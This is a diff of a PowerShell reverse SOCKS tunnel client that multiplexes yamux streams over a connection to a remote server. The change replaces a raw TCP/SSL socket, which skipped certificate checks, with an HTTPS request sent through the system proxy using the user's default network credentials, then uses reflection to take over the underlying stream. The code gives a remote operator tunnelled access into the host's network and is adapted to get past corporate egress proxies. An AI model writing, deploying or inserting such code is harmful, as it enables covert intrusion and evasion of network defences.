@@ -1,6 +1,6 @@
 param (
     [string]$server = "localhost", 
-    [int]$port = 4888,    
+    [int]$port = 8443,    
     [string]$pass = "microsoft"
 )
 
@@ -229,24 +229,40 @@ $bufsize = 8192
     }
 }
 
-"Debug : begin" | out-file c:\work\log.txt
+#"Debug : begin" | out-file c:\work\log.txt
 [System.Collections.ArrayList]$streams = @{}
 $StopFlag = [hashtable]::Synchronized(@{})#Shared array of flags. 0 - normal;1 - got FIN from yamux; 2 - got FIN from socks; 3 - got FIN from socks and FIN packet was sent to yamux
 $RcvBytes = [hashtable]::Synchronized(@{})#Shared array of num of received bytes. When its eq or more than 256144 - then we have to send ymx window update packet, otherwise files > 256k will not be transfered by yamux
 $StopFlag[0] = -1
 
-$tcpConnection = New-Object System.Net.Sockets.TcpClient($server, $port)
-#$tcpStream = $tcpConnection.GetStream() #uncomment for cleartext connection
-#comment 2 lines for cleartext connection
-$tcpStream = New-Object System.Net.Security.SslStream($tcpConnection.GetStream(),$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
-$tcpStream.AuthenticateAsClient('127.0.0.1')
+$request = [System.Net.HttpWebRequest]::Create("https://"+$Server+":"+$port+"/") 
+$request.Method = "GET"
+$request.Headers.Add("Xauth",$pass)
 
-if ($tcpConnection.Connected)
+
+$proxy = [System.Net.WebRequest]::GetSystemWebProxy()
+$proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+$request.Proxy = $proxy
+
+try {$serverResponse = $request.GetResponse()} catch {$serverResponse = $null; write-host "Can not connect"; exit}
+
+write-host "proxy connected"
+$responseStream = $serverResponse.GetResponseStream()
+
+#----------------------------------------------------------------------------------------------------
+# Reflection inspection to retrieve and reuse the underlying networkStream instance
+$BindingFlags= [Reflection.BindingFlags] "NonPublic,Instance"
+$rsType = $responseStream.GetType()
+$connectionProperty = $rsType.GetProperty("Connection", $BindingFlags)
+$connection = $connectionProperty.GetValue($responseStream, $null)
+$connectionType = $connection.GetType()
+$networkStreamProperty = $connectionType.GetProperty("NetworkStream", $BindingFlags)
+$tcpStream = $networkStreamProperty.GetValue($connection, $null)
+
+if ($tcpStream)
 {
  write-host "conneccted"
     $connected = $true
-    
-    $tcpstream.Write([byte[]][char[]]$pass,0,$pass.length)
 
     #create runspase for shared arrays StopFlag, RcvBytes
     $ymxrunspace = [runspacefactory]::CreateRunspace()
@@ -263,7 +279,7 @@ if ($tcpConnection.Connected)
     [System.IAsyncResult]$AsyncJobResult = $null
     $ymxAsyncJob = $PS1.BeginInvoke()
         
-    while($tcpConnection.Connected -and $connected){
+    while($connected){
         $ymxbuffer = $null
         $tnum = 0 
         #read 12 bytes of ymx header; we have to use cycle, because there may be multiple read attempts...
@@ -272,19 +288,17 @@ if ($tcpConnection.Connected)
             if ($num -eq 0 ) {$connected=$false; break;}
             $tnum += $num
             $ymxbuffer += $tmpbuffer[0..($num-1)]
-        }while ($tnum -lt 12 -and $tcpConnection.Connected)
+        }while ($tnum -lt 12 -and $connected)
         
 	 if ($ymxbuffer[1] -eq 1 -and $ymxbuffer[3] -eq 1){
 	    write-host "Debug: got ymx SYN"
 	    $ymxstream = [bitconverter]::ToInt32($ymxbuffer[7..4],0)
-	    #write-host "Yamux stream ID: $ymxstream"
 
 	    #we do not need send reply for ymx SYN, and we do not send it...
 	    #$outbuf = [byte[]](0x00,0x01,0x00,0x02,$ymxstream[3],$ymxstream[2],$ymxstream[1],$ymxstream[0],0x00,0x00,0x00,0x00)
 	    #$tcpstream.Write($outbuf,0,12)
 
 	    #create and start thread
-	    #write-host "Debug: creating thread"
         #create 2 pipes: IN and OUT. Create 4 streams: Server and Client stream for every pipe 
 	    $sipipe = new-object System.IO.Pipes.AnonymousPipeServerStream(1)
         $sopipe = new-object System.IO.Pipes.AnonymousPipeServerStream(2,1)
@@ -314,12 +328,12 @@ if ($tcpConnection.Connected)
         $readbuffer.clear()
 
 	 }elseif ($ymxbuffer[1] -eq 2){
-	 	#write-host "got ymx keepalive"
+	 	write-host "got ymx keepalive"
 	 	$pingval = [bitconverter]::ToInt32($ymxbuffer[11..8],0)
         #set $StopFlag[0] to recieved ping value. This instruct yamuxScript to send this value back in ymx keepalive message
         $StopFlag[0] = $pingval
 	 }elseif ($ymxbuffer[1] -eq 0) {
-        #write-host "Debug: got ymx DATA"
+        
 	    $ymxstream = [bitconverter]::ToInt32($ymxbuffer[7..4],0)
         $ymxcount = [bitconverter]::ToInt32($ymxbuffer[11..8],0)
 	    
@@ -330,8 +344,6 @@ if ($tcpConnection.Connected)
         $outStream = $streams[$streamind].soutputStream
         if($inpStream -and $outStream ){
             #read raw data
-            #write-host "Debug: read raw ymx DATA"
-
             $databuffer = $null
             $tnum = 0 
             do {
@@ -339,9 +351,7 @@ if ($tcpConnection.Connected)
                 { $num = $tcpStream.Read($buffer,0,($ymxcount-$tnum)) }
                 $tnum += $num
                 $databuffer += $buffer[0..($num-1)]
-            }while ($tnum -lt $ymxcount -and $tcpConnection.Connected)
-            
-            #write-host "out " $ymxcount" bytes to outstream at index:" $streamind
+            }while ($tnum -lt $ymxcount -and $connected)
             $outStream.Write($databuffer,0,$ymxcount)
 
             #update $RcvBytes
@@ -371,10 +381,6 @@ if ($tcpConnection.Connected)
             $StopFlag[$ymxstream] = 1 
         }
         start-sleep -milliseconds 200 #wait for thread check flag
-        #$streams[$streamind].cinputStream.close()
-        #$streams[$streamind].coutputStream.close()
-        #$streams[$streamind].sinputStream.close()
-        #$streams[$streamind].soutputStream.close()
         $streams[$streamind].psobj.Runspace.close()
         $streams[$streamind].psobj.Dispose()
         $streams[$streamind].readbuffer.clear()
